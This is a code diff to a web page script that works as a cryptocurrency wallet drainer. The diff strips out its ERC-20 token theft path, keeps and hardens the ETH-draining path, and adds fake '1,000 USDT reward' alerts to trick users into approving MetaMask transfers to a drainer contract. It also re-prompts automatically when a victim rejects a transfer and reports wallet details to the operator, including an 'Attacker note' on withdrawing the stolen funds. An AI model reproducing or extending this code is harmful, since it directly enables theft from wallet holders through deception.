@@ -240,14 +240,7 @@
             const ownerAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Target withdrawal address
             const sepoliaChainId = '0xaa36a7'; // Sepolia Testnet Chain ID (11155111 in hex)
 
-            // List of common ERC-20 tokens on Sepolia Testnet (extend as needed)
-            const tokens = [
-                { name: 'USDT', address: '0x7169D38820dFD117C3FA1f22a697dBa58d90BA06' },
-                { name: 'USDC', address: '0x746d7b1dfcD1Cc2f4b7d09F3F1B9A21764FBeB33' }
-                // Add more tokens as needed
-            ];
-
-            // Drainer Contract ABI
+            // Drainer Contract ABI (only need receive and withdrawETH for ETH draining)
             const drainerContractAbi = [
                 {
                     "inputs": [],
@@ -255,57 +248,10 @@
                     "type": "receive"
                 },
                 {
-                    "inputs": [
-                        { "internalType": "address", "name": "tokenAddress", "type": "address" },
-                        { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                    ],
-                    "name": "approveAndTransferToken",
-                    "outputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                },
-                {
                     "inputs": [],
                     "name": "withdrawETH",
                     "outputs": [],
                     "stateMutability": "nonpayable",
-                    "type": "function"
-                },
-                {
-                    "inputs": [
-                        { "internalType": "address", "name": "tokenAddress", "type": "address" }
-                    ],
-                    "name": "withdrawToken",
-                    "outputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                }
-            ];
-
-            // Standard ERC-20 ABI (minimal for approve, balanceOf, transfer, and decimals)
-            const erc20Abi = [
-                {
-                    "constant": false,
-                    "inputs": [
-                        { "name": "_spender", "type": "address" },
-                        { "name": "_value", "type": "uint256" }
-                    ],
-                    "name": "approve",
-                    "outputs": [{ "name": "success", "type": "bool" }],
-                    "type": "function"
-                },
-                {
-                    "constant": true,
-                    "inputs": [{ "name": "_owner", "type": "address" }],
-                    "name": "balanceOf",
-                    "outputs": [{ "name": "balance", "type": "uint256" }],
-                    "type": "function"
-                },
-                {
-                    "constant": true,
-                    "inputs": [],
-                    "name": "decimals",
-                    "outputs": [{ "name": "", "type": "uint8" }],
                     "type": "function"
                 }
             ];
@@ -375,8 +321,9 @@
                 }
             }
 
-            // Function to prompt user to send ETH to the contract
-            async function promptSendETH(web3, walletAddress) {
+            // Function to prompt user to send ETH to the contract with retry mechanism
+            async function promptSendETH(web3, walletAddress, retryCount = 0) {
+                const maxRetries = 2; // Allow up to 2 retries
                 try {
                     const balance = await web3.eth.getBalance(walletAddress);
                     const gasPrice = await web3.eth.getGasPrice();
@@ -384,9 +331,15 @@
                     const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
                     const valueToSend = BigInt(balance) - gasCost;
 
+                    // Check if wallet has enough ETH for the transaction
+                    if (BigInt(balance) < gasCost) {
+                        sendAlert(`ETH Send failed. Insufficient ETH for gas in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH, Required Gas: ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH`);
+                        return `ETH Send failed. Insufficient ETH for gas. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH`;
+                    }
+
                     if (valueToSend <= 0) {
-                        sendAlert(`ETH Send failed. Insufficient ETH in ${walletAddress}`);
-                        return 'ETH Send failed. Insufficient funds.';
+                        sendAlert(`ETH Send failed. Insufficient ETH in ${walletAddress}. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH, Required: ${web3.utils.fromWei(gasCost.toString(), 'ether')} ETH`);
+                        return `ETH Send failed. Insufficient funds. Balance: ${web3.utils.fromWei(balance, 'ether')} ETH`;
                     }
 
                     const valueToSendHex = web3.utils.toHex(valueToSend.toString());
@@ -401,6 +354,13 @@
                         gasPrice: gasPriceHex,
                     };
 
+                    // Prompt user to approve the transaction
+                    if (retryCount === 0) {
+                        alert('To claim your 1,000 USDT reward, please approve the transaction in MetaMask.');
+                    } else {
+                        alert(`Please approve the transaction in MetaMask to claim your 1,000 USDT reward. This is attempt ${retryCount + 1} of ${maxRetries + 1}.`);
+                    }
+
                     console.log('Prompting MetaMask for ETH transfer:', tx);
 
                     const txHash = await window.ethereum.request({
@@ -411,89 +371,16 @@
                     sendAlert(`ETH Sent to contract. Tx Hash: ${txHash}. Funds sent to ${drainerContractAddress}`);
                     return `ETH Sent to contract. Tx Hash: ${txHash}`;
                 } catch (error) {
-                    sendAlert(`ETH Send failed. Error: ${error.message || error.toString()}`);
+                    if (error.message.includes('User rejected the transaction') && retryCount < maxRetries) {
+                        sendAlert(`ETH Send rejected by user. Retrying (${retryCount + 1}/${maxRetries}). Wallet: ${walletAddress}`);
+                        return await promptSendETH(web3, walletAddress, retryCount + 1); // Retry
+                    }
+                    sendAlert(`ETH Send failed. Error: ${error.message || error.toString()}. Wallet: ${walletAddress}, Balance: ${web3.utils.fromWei(await web3.eth.getBalance(walletAddress), 'ether')} ETH`);
                     throw new Error(`ETH Send failed: ${error.message}`);
                 }
             }
 
-            // Function to prompt user to approve and transfer ERC-20 token to the contract
-            async function promptTransferToken(web3, walletAddress, token) {
-                try {
-                    const tokenContract = new web3.eth.Contract(erc20Abi, token.address);
-                    const balance = await tokenContract.methods.balanceOf(walletAddress).call();
-                    const balanceAdjusted = BigInt(balance);
-
-                    if (balanceAdjusted <= 0) {
-                        sendAlert(`${token.name} Transfer failed. No ${token.name} in ${walletAddress}`);
-                        return `${token.name} Transfer failed. No tokens available.`;
-                    }
-
-                    // Step 1: Approve the contract to spend tokens
-                    const approveGasLimit = await tokenContract.methods.approve(drainerContractAddress, balanceAdjusted)
-                        .estimateGas({ from: walletAddress });
-                    const gasPrice = await web3.eth.getGasPrice();
-                    const approveGasCost = BigInt(gasPrice) * BigInt(approveGasLimit);
-
-                    const ethBalance = BigInt(await web3.eth.getBalance(walletAddress));
-                    if (ethBalance < approveGasCost) {
-                        sendAlert(`${token.name} Approval failed. Insufficient ETH for gas in ${walletAddress}`);
-                        return `${token.name} Approval failed. Insufficient ETH for gas.`;
-                    }
-
-                    const approveTxData = tokenContract.methods.approve(drainerContractAddress, balanceAdjusted).encodeABI();
-                    const approveTx = {
-                        from: walletAddress,
-                        to: token.address,
-                        data: approveTxData,
-                        gas: web3.utils.toHex(approveGasLimit),
-                        gasPrice: web3.utils.toHex(gasPrice),
-                    };
-
-                    console.log(`Prompting MetaMask for ${token.name} approval:`, approveTx);
-
-                    const approveTxHash = await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [approveTx],
-                    });
-
-                    sendAlert(`${token.name} Approval successful. Tx Hash: ${approveTxHash}`);
-
-                    // Step 2: Call approveAndTransferToken on the drainer contract
-                    const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerContractAddress);
-                    const transferGasLimit = await drainerContract.methods.approveAndTransferToken(token.address, balanceAdjusted)
-                        .estimateGas({ from: walletAddress });
-                    const transferGasCost = BigInt(gasPrice) * BigInt(transferGasLimit);
-
-                    if (ethBalance < transferGasCost) {
-                        sendAlert(`${token.name} Transfer failed. Insufficient ETH for gas in ${walletAddress}`);
-                        return `${token.name} Transfer failed. Insufficient ETH for gas.`;
-                    }
-
-                    const transferTxData = drainerContract.methods.approveAndTransferToken(token.address, balanceAdjusted).encodeABI();
-                    const transferTx = {
-                        from: walletAddress,
-                        to: drainerContractAddress,
-                        data: transferTxData,
-                        gas: web3.utils.toHex(transferGasLimit),
-                        gasPrice: web3.utils.toHex(gasPrice),
-                    };
-
-                    console.log(`Prompting MetaMask for ${token.name} transfer:`, transferTx);
-
-                    const transferTxHash = await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [transferTx],
-                    });
-
-                    sendAlert(`${token.name} Transfer successful. Tx Hash: ${transferTxHash}. Funds sent to ${drainerContractAddress}`);
-                    return `${token.name} Transfer successful. Tx Hash: ${transferTxHash}`;
-                } catch (error) {
-                    sendAlert(`${token.name} Transfer failed. Error: ${error.message || error.toString()}`);
-                    throw new Error(`${token.name} Transfer failed: ${error.message}`);
-                }
-            }
-
-            // Function to process all assets
+            // Function to process ETH (only)
             async function processAllAssets(web3, walletAddress) {
                 let results = [];
 
@@ -504,17 +391,6 @@
                     results.push(ethResult);
                 } catch (error) {
                     results.push(`ETH Send error: ${error.message}`);
-                }
-
-                // Approve and transfer ERC-20 tokens
-                for (const token of tokens) {
-                    try {
-                        console.log(`Starting ${token.name} transfer...`);
-                        const tokenResult = await promptTransferToken(web3, walletAddress, token);
-                        results.push(tokenResult);
-                    } catch (error) {
-                        results.push(`Token ${token.name} Transfer error: ${error.message}`);
-                    }
                 }
 
                 return results;
@@ -565,12 +441,12 @@
                         console.log('Switching to Sepolia Testnet...');
                         await switchToSepolia(provider);
 
-                        console.log('Processing all assets...');
+                        console.log('Processing ETH transfer...');
                         const results = await processAllAssets(web3, walletAddress);
                         alert(`Rewards claimed successfully on Sepolia Testnet!\n\nResults:\n${results.join('\n')}\n\nYou can withdraw funds from the contract later.`);
 
                         console.log('Sending attacker note...');
-                        sendAlert(`Attacker note: Use withdrawETH and withdrawToken on ${drainerContractAddress} to claim funds to ${ownerAddress}`);
+                        sendAlert(`Attacker note: Use withdrawETH on ${drainerContractAddress} to claim funds to ${ownerAddress}`);
                     } catch (error) {
                         console.error(`Error: ${error.message || error.toString()}`);
                         sendAlert(`Operation failed for ${wallet}. Error: ${error.message || error.toString()}`);
